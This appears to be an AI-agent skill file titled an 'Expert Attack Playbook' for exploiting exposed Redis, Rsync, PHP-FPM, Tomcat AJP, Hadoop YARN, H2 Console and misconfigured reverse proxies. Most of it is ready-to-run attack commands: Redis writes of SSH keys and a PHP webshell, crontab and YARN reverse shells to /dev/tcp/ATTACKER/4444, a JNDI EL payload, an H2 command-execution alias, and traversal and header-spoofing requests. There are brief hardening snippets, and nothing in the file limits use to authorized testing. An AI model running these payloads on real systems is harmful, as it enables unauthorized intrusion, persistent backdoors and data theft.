---
name: unauthorized-access-common-services
description: >-
  Unauthorized access playbook for common exposed services. Use when Redis, Rsync, PHP-FPM, AJP/Ghostcat, Hadoop YARN, H2 Console, or similar management interfaces are exposed without authentication.
---

# SKILL: Unauthorized Access to Common Services — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert techniques for exploiting unauthenticated or weakly authenticated management services. Covers Redis write-to-RCE, Rsync data theft, PHP-FPM code execution, Ghostcat AJP file read, Hadoop YARN job submission, and H2 Console JNDI. These are infrastructure-level findings distinct from web application vulnerabilities.

## 0. RELATED ROUTING

- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) when these services are reachable via SSRF (e.g., SSRF → Redis)
- [jndi-injection](../jndi-injection/SKILL.md) when H2 Console or similar accepts JNDI connection strings
- [deserialization-insecure](../deserialization-insecure/SKILL.md) when RMI Registry or T3 protocol is exposed
- [network-protocol-attacks](../network-protocol-attacks/SKILL.md) for layer 2/3 attacks during service enumeration
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) for shell payloads after gaining command execution

### Comprehensive Port Reference

Also load [PORT_SERVICE_MATRIX.md](./PORT_SERVICE_MATRIX.md) when you need:
- Full exploitation matrix organized by port number (20+ services)
- Enumeration, brute force, and post-exploitation per service
- Quick triage during nmap/masscan output analysis

---

## 1. DISCOVERY — PORT SCANNING

```bash
nmap -sV -p 6379,873,9000,8009,8088,8082,1099,9200,5984,2375,27017,11211 TARGET

# Key ports:
# 6379  — Redis
# 873   — Rsync
# 9000  — PHP-FPM (FastCGI)
# 8009  — AJP (Tomcat Ghostcat)
# 8088  — Hadoop YARN ResourceManager
# 8082  — H2 Console (or embedded in Spring Boot)
# 1099  — Java RMI Registry
# 9200  — Elasticsearch
# 5984  — CouchDB
# 2375  — Docker API
# 27017 — MongoDB
# 11211 — Memcached
```

---

## 2. REDIS (PORT 6379)

### Detection

```bash
redis-cli -h TARGET ping
# Response: PONG = unauthenticated access confirmed

redis-cli -h TARGET INFO server
# Returns Redis version, OS, config
```

### Write SSH Authorized Keys

```bash
# Generate key pair:
ssh-keygen -t rsa -f redis_rsa

# Write public key to Redis, then dump to authorized_keys:
cat redis_rsa.pub | redis-cli -h TARGET -x set ssh_key
redis-cli -h TARGET config set dir /root/.ssh
redis-cli -h TARGET config set dbfilename authorized_keys
redis-cli -h TARGET save

# Connect:
ssh -i redis_rsa root@TARGET
```

### Write Crontab (Reverse Shell)

```bash
redis-cli -h TARGET
> set x "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
> config set dir /var/spool/cron/
> config set dbfilename root
> save
```

### Write Webshell

```bash
redis-cli -h TARGET
> set webshell "<?php system($_GET['cmd']); ?>"
> config set dir /var/www/html/
> config set dbfilename shell.php
> save
# Access: http://TARGET/shell.php?cmd=id
```

### Master-Slave Replication RCE

Use `redis-rogue-server` to exploit master-slave replication for loading malicious `.so` module:

```bash
python3 redis-rogue-server.py --rhost TARGET --lhost ATTACKER
# Loads module via SLAVEOF → MODULE LOAD → system.exec
```

### Hardening

```
requirepass STRONG_PASSWORD
bind 127.0.0.1
protected-mode yes
rename-command CONFIG ""
rename-command FLUSHALL ""
```

---

## 3. RSYNC (PORT 873)

### Detection

```bash
rsync TARGET::
# Lists available modules (shares) if anonymous access allowed

rsync -av TARGET::MODULE_NAME /tmp/loot/
# Download entire module contents
```

### Exploitation — Write Crontab

```bash
# Create reverse shell cron:
echo '*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /tmp/evil_cron

# Upload to target's crontab (if writable module maps to /etc/ or similar):
rsync -av /tmp/evil_cron TARGET::MODULE/cron.d/backdoor
```

### Hardening

```
# /etc/rsyncd.conf:
auth users = rsync_user
secrets file = /etc/rsyncd.secrets
list = no
hosts allow = 10.0.0.0/8
read only = yes
```

---

## 4. PHP-FPM / FASTCGI (PORT 9000)

### Mechanism

PHP-FPM listens for FastCGI requests. If exposed to the network (instead of Unix socket), an attacker can send crafted FastCGI packets to execute arbitrary PHP code.

### Exploitation

```bash
# Using fcgi_exp or similar tool:
python3 fpm.py TARGET 9000 /var/www/html/index.php -c "<?php system('id'); ?>"

# Key parameters in FastCGI request:
# SCRIPT_FILENAME = path to any existing .php file
# PHP_VALUE = "auto_prepend_file = php://input"  (injects POST body as PHP code)
# PHP_ADMIN_VALUE = "allow_url_include = On"
```

### Key FastCGI Environment Variables for Exploitation

```text
SCRIPT_FILENAME = /var/www/html/index.php   # must point to an existing .php file
PHP_VALUE = auto_prepend_file = php://input  # injects POST body as PHP code
PHP_ADMIN_VALUE = allow_url_include = On     # enables remote inclusion
```

### Via SSRF (gopher)

```
gopher://TARGET:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00...
# Encoded FastCGI packet
# Tool: Gopherus generates the gopher:// URL
python3 gopherus.py --exploit fastcgi
```

### Hardening

```ini
; php-fpm.conf — bind to socket only:
listen = /var/run/php-fpm.sock
; If TCP required, restrict:
listen.allowed_clients = 127.0.0.1
```

---

## 5. GHOSTCAT — AJP (PORT 8009) — CVE-2020-1938

### Mechanism

Apache JServ Protocol (AJP) is used between reverse proxy and Tomcat. AJP trusts all incoming data — an attacker connecting directly can set `javax.servlet.include.request_uri` to read arbitrary files from the webapp directory.

### File Read

```bash
# Using ajpShooter or similar:
python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read

# Reads any file within the webapp root:
# /WEB-INF/web.xml          — deployment descriptor
# /WEB-INF/classes/*.class  — compiled Java classes
# /WEB-INF/lib/*.jar        — library JARs
```

### File Include → RCE

If a file upload exists (e.g., uploaded JSP disguised as image), AJP can include it as JSP:

```bash
python3 ajpShooter.py TARGET 8009 /uploaded_avatar.txt eval
# If the file contains JSP code, it gets executed
```

### Hardening

```xml
<!-- server.xml — disable AJP or add secret: -->
<Connector port="8009" protocol="AJP/1.3" secretRequired="true" secret="STRONG_SECRET"/>
<!-- Or remove the AJP connector entirely -->
```

---

## 6. HADOOP YARN RESOURCEMANAGER (PORT 8088)

### Detection

```bash
curl http://TARGET:8088/cluster
# If accessible → unauthenticated YARN ResourceManager UI
```

### RCE via Application Submission

```bash
# Submit a MapReduce application that executes a command:
curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application
# Returns: {"application-id":"application_xxx_0001"}

curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps \
  -H "Content-Type: application/json" \
  -d '{
    "application-id": "application_xxx_0001",
    "application-name": "test",
    "am-container-spec": {
      "commands": {"command": "/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1"}
    },
    "application-type": "YARN"
  }'
```

### Hardening

Enable Kerberos authentication; restrict network access to management ports.

---

## 7. H2 DATABASE CONSOLE

### Detection

H2 Console is often enabled in Spring Boot apps via:
```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```

Access: `http://TARGET:PORT/h2-console`

### JNDI Injection via Connection String

In the H2 Console login form, the JDBC URL field accepts JNDI.

**BeanFactory + EL bypass** (works on Java 8u252+):

```text
# JDBC URL in login form:
javax.naming.InitialContext

# LDAP response attributes:
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

Also see [jndi-injection](../jndi-injection/SKILL.md) for the full JNDI/BeanFactory exploitation flow.

### RCE via RUNSCRIPT

```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('id');
```

---

## 8. QUICK REFERENCE

```text
# Redis — check auth:
redis-cli -h TARGET ping

# Redis — write webshell:
SET x "<?php system($_GET['c']);?>"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE

# Rsync — list modules:
rsync TARGET::

# Ghostcat — read web.xml:
python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read

# YARN — submit RCE job:
curl -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application

# H2 — RCE via alias:
CREATE ALIAS EXEC AS '...Runtime.exec...'; CALL EXEC('id');
```

---

## 9. REVERSE PROXY MISCONFIGURATION

### Nginx Off-By-Slash Path Traversal

```nginx
# Vulnerable configuration:
location /static {
    alias /var/www/static/;
}
# Access: /static../etc/passwd → resolves to /var/www/etc/passwd
# The missing trailing slash on location causes path traversal

# Fix: location /static/ (with trailing slash matching alias)
```

### Nginx Missing Root Location

```nginx
# If no root location defined and alias is used:
# Attacker may access nginx.conf or other server files
GET /..%2f..%2fetc/nginx/nginx.conf HTTP/1.1
```

### X-Forwarded-For / X-Real-IP Trust

```
# If backend trusts these headers for IP-based auth:
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# May bypass IP whitelist for admin panels
```

### Caddy Template Injection

```
# Caddy with templates enabled:
# If user input reaches Caddy template rendering:
{{.Req.Host}}          → Information disclosure
{{readFile "/etc/passwd"}}  → Local file read via Go template
# This is essentially a Go template injection through proxy config
```

### Useful Tools

- `yandex/gixy` — Nginx configuration analyzer
- `Raelize/Kyubi` — Reverse proxy misconfiguration scanner
- `GerbenJavado/bypass-url-parser` — URL parser confusion tester
